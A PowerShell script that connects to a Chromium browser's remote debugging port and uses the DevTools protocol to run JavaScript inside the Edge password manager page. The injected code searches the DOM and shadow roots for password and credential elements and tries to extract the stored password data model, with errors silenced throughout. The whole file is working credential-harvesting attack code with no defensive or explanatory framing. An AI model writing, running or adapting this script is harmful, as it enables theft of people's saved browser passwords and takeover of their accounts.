$ErrorActionPreference = 'SilentlyContinue'

# Find PM page
$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$pm = $targets | Where-Object { $_.url -match 'password' } | Select-Object -First 1
if (-not $pm) { Write-Output "no PM page"; exit }
Write-Output "[*] ws: $($pm.webSocketDebuggerUrl)"

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$pm.webSocketDebuggerUrl, $ct).Wait()
Start-Sleep 3

$buf = [byte[]]::new(10485760)
$id = 1
function Eval {
    param([string]$js)
    $script:id++
    $m = @{ id = $script:id; method = "Runtime.evaluate"; params = @{ expression = $js; returnByValue = $true } }
    $json = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($json)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# Check what's on the page
Write-Output "[*] page body..."
$r = Eval 'document.body.innerHTML.substring(0, 2000)'
$obj = $r | ConvertFrom-Json
Write-Output $obj.result.result.value

Write-Output ""
Write-Output "[*] custom elements..."
$r2 = Eval 'Array.from(new Set(document.querySelectorAll("*").length > 0 ? [...document.querySelectorAll("*")].map(e => e.tagName)) ).join(", ")'
$obj2 = $r2 | ConvertFrom-Json
Write-Output $obj2.result.result.value

Write-Output ""
Write-Output "[*] shadow hosts..."
$r3 = Eval '[...document.querySelectorAll("*")].filter(e => e.shadowRoot).map(e => e.tagName).join(", ")'
$obj3 = $r3 | ConvertFrom-Json
Write-Output $obj3.result.result.value

# Try to find password rows in shadow DOM
Write-Output ""
Write-Output "[*] password rows..."
$r4 = Eval '
(function() {
    let results = [];
    function searchShadow(root, depth) {
        if (depth > 5) return;
        try {
            let children = root.querySelectorAll("*");
            for (let el of children) {
                if (el.tagName.toLowerCase().includes("password") || 
                    el.tagName.toLowerCase().includes("credential") ||
                    el.id.toLowerCase().includes("password")) {
                    results.push(el.tagName + "#" + el.id + " (depth " + depth + ")");
                }
                if (el.shadowRoot) {
                    searchShadow(el.shadowRoot, depth + 1);
                }
            }
        } catch(e) {}
    }
    searchShadow(document, 0);
    return JSON.stringify(results);
})()
'
$obj4 = $r4 | ConvertFrom-Json
Write-Output $obj4.result.result.value

# Try to get the passwords data from the page's JavaScript state
Write-Output ""
Write-Output "[*] passwords data model..."
$r5 = Eval '
(function() {
    // Try to find the passwords data in Edge password manager
    if (window.passwords) return JSON.stringify(window.passwords);
    if (window.PasswordManager) return JSON.stringify(window.PasswordManager);
    
    // Try to find any data attributes or JSON in the page
    let el = document.querySelector("password-manager, password-list, cr-password-list");
    if (el) return JSON.stringify({found: el.tagName, data: el.data});
    
    // Search all elements with data bindings
    let all = document.querySelectorAll("[data-sourceurl], [data-username], [data-password]");
    let results = [];
    for (let el of all) {
        results.push({tag: el.tagName, url: el.dataset.sourceurl, user: el.dataset.username});
    }
    return JSON.stringify(results);
})()
'
$obj5 = $r5 | ConvertFrom-Json
Write-Output $obj5.result.result.value

$ws.Dispose()